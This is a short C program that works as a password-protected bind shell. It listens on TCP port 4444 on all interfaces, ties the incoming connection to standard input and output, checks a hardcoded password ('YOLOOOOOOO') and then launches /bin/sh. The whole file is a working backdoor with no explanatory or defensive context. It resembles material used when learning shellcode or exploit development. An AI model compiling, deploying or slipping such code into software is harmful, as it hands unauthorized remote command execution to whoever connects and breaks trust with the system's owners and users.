#include<stdlib.h>
#include<string.h>
#include<strings.h>
#include<unistd.h>
#include<arpa/inet.h>

int main()
{
        struct sockaddr_in server;
        struct sockaddr_in client;
        int sock;
        int new_sock;
        int sockaddr_len = sizeof(struct sockaddr_in);
        char *arguments[] = { "/bin/sh", 0, "4444" };
        char buf[16];
        char pass[] = "YOLOOOOOOO";

        sock = socket(AF_INET, SOCK_STREAM, 0);

        server.sin_family = AF_INET;
        server.sin_port = htons(atoi(arguments[2]));
        server.sin_addr.s_addr = INADDR_ANY;
        bzero(&server.sin_zero, 8);
        
        bind(sock, (struct sockaddr *)&server, sockaddr_len);

        listen(sock, 2);

        new_sock = accept(sock, (struct sockaddr *)&client, &sockaddr_len);
        close(sock);

        dup2(new_sock, 0);
        dup2(new_sock, 1);
        dup2(new_sock, 2);
        read(new_sock, buf, 16);
        buf[strcspn(buf, "\n")] = 0;
        if (strcmp(pass, buf) == 0)
        {
                execve(arguments[0], &arguments[0], NULL);
        }

}
